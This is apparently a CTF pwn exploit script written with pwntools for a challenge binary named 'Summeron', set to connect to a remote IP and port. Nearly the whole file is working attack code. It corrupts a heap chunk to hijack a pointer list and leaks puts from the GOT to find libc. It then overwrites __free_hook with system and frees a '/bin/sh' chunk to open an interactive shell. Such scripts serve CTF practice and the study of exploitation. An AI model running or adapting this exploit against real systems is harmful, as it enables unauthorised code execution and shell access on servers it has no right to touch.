# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './Summeron'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '183.129.189.60'
    port = '10011'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def add(name_len , data_len , name = 'a\n', data = 'a\n' ):
    cmd(1)
    sla('length of the Summoner\'s name:' , name_len)
    sla('length of the summoner\'s introduction:' , data_len)
    sla('name:' , name)
    sla('introduction:' , data)

def edit( idx,type ,data):
    cmd(2)
    sla('index' , idx)
    sla('introduction?(1/2)' , type)
    if (type == 1):
        sa('new summoner:' , data)
    else:
        sa('introduction:' , data)

def delete(idx):
    cmd(3)
    sla('index' , idx)

def show(idx):
    cmd(4)
    sla('index' , idx)

# one_gad = one_gadget(libc.path)

ptr_list = 0x602040 - 8

def attack():

    add(0x10 , 0x70) #0
    add(0x38 , 0x38)

    delete(1)

    payload = flat(
        'a'*0x40 ,
        0 , 0x81,
        ptr_list
    )
    puts_got = elf.got['puts']

    edit( 0 , 2 , payload + '\n')
    add(0x38 , 0x38)
    add(0x38 , 0x38 , p32(0x80)*6 + p64(puts_got)*2 , p64(puts_got) )

    show(0)
    puts_addr = l64()
    libc.address = puts_addr - libc.sym['puts']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()

    edit(3 , 1 , p32(0x80)*6 + p64(__free_hook)*3 + p64(binsh_addr) + '\n')

    edit(2 , 1 ,p64(system_addr) + '\n')
    delete(3)
    # dbg()

    # lg('puts',puts_addr)
    # dbg()
    
    
    

    # payload = flat(
    #     'a'*0x28 ,
    #     0 , 0x2b0*2 + 1
    # )
    # edit( 0 , 2 , payload )
    # delete(1)
    # add(0x150 , 0x150) #1

    # delete(0)
    # add(0x150 , 0x150) #0
    # dbg()
    # delete(3)
    # delete(0)
    # # show(2)
    # # dbg()
    # # sl('echo shell')
    # # rl('shell')


    p.interactive()

attack()

'''
@File    :   Summeron.py
@Time    :   2021/10/14 12:42:49
@Author  :   Niyah 
'''